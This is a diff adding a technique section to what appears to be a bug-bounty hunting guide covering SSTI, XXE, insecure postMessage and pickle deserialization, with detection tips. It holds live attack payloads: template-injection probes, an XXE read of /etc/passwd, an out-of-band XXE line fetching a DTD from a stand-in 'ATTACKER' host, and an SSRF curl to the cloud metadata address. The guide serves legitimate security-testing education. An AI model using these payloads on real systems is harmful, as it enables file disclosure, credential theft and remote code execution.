@@ -129,6 +129,84 @@ curl "https://target.com/api?url=http://169.254.169.254/latest/meta-data/"
 
 ---
 
+## 🧪 Technique Deep-Dives
+
+Four modern web classes worth a dedicated detection pass — each one shows up
+regularly on live programs and is easy to miss with generic scanners.
+
+### Server-Side Template Injection (SSTI) — CWE-1336 / CWE-94
+User input reaches a template engine as *template*, not as *data*, so the
+engine evaluates it. Classic path to RCE in Node (Handlebars, Pug, EJS),
+Python (Jinja2, Mako), Java (Freemarker, Velocity), Ruby (ERB).
+
+```bash
+# 1. Detect: send polyglot math/marker probes in every reflected field
+#    (names, search, subject, profile bio, filenames, CSV/PDF export fields)
+#    ${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  {7*7}
+#    A reflected "49" (not "7*7") = the engine evaluated it → SSTI.
+# 2. Fingerprint the engine (49 vs error vs {{7*7}} unchanged) then escalate.
+```
+- **Handlebars (Node)** is a frequent real-world case (e.g. CVE-2026-33937, AST
+  injection → RCE in 4.0.0–4.7.8): a crafted template abuses the compiler's AST
+  to reach `require`/`process` and execute commands.
+- Where to look: anything that renders user data into emails, PDFs, reports,
+  dashboards, or "preview" features — those paths often skip autoescaping.
+
+### XML External Entity (XXE) — CWE-611
+An XML parser with external-entity resolution enabled reads local files or
+makes server-side requests (SSRF) from attacker-supplied XML.
+
+```xml
+<!-- File read -->
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+<r>&x;</r>
+
+<!-- Blind/OOB (exfil via external DTD when no reflection) -->
+<!DOCTYPE r [<!ENTITY % p SYSTEM "http://ATTACKER/evil.dtd"> %p;]>
+```
+- Where to look: any endpoint accepting XML — SAML (`SAMLResponse`), SOAP/WSDL
+  services, SVG/DOCX/XLSX uploads (Office files are ZIP+XML), RSS/sitemap
+  importers, `Content-Type: application/xml` or `text/xml` APIs.
+- Escalates to file disclosure, SSRF→IMDS (AWS creds), and sometimes RCE.
+
+### Insecure postMessage — CWE-345 / CWE-346
+A page's `message` listener trusts cross-origin input because it never
+validates `event.origin` (or validates with loose `indexOf`/`includes`). The
+message data then drives an authenticated action, a `fetch`, or a DOM sink.
+
+```javascript
+// Vulnerable pattern to grep for in the app's JS bundles:
+window.addEventListener("message", (e) => {
+  // no strict e.origin check...
+  fetch("/api/do", { method: "POST", credentials: "include",
+                     body: e.data });   // attacker-controlled request w/ victim cookies
+});
+```
+- Detect: grep bundles for `addEventListener("message"` / `onmessage`; check
+  whether `e.origin` is compared with `===` against an allowlist, and where
+  `e.data` flows (fetch/XHR → authorized-request-on-behalf-of-victim; innerHTML
+  → DOM XSS; location → open redirect). Burp **DOM Invader** automates this.
+- Impact: fully-authorized HTTP requests on behalf of the victim, ATO.
+
+### Insecure Deserialization — CWE-502
+Untrusted serialized data is deserialized into live objects → RCE.
+
+```bash
+# Python pickle: pickle.loads() on user input = RCE.
+# A malicious object defines __reduce__ -> (os.system, ("cmd",)).
+# Signature of a pickle blob: starts with \x80 (base64 often begins "gAS...").
+```
+- Where to look: session cookies/tokens that base64-decode to a pickle
+  (`gAS...`), cache layers (Redis/Memcached storing pickles), task queues
+  (Celery), and **ML model files** — `.pkl`, `joblib`, and PyTorch `.pt` all use
+  pickle underneath, so "upload a model" features are a prime RCE vector
+  (MLflow-class issues). Java (`ac ed 00 05` / `rO0` base64), PHP (`O:` object
+  strings), Ruby, and .NET have the equivalent primitive.
+- Always one of the highest-paid classes when reachable (Critical/RCE).
+
+---
+
 ## 🛠️ Essential Tools
 
 ### Reconnaissance
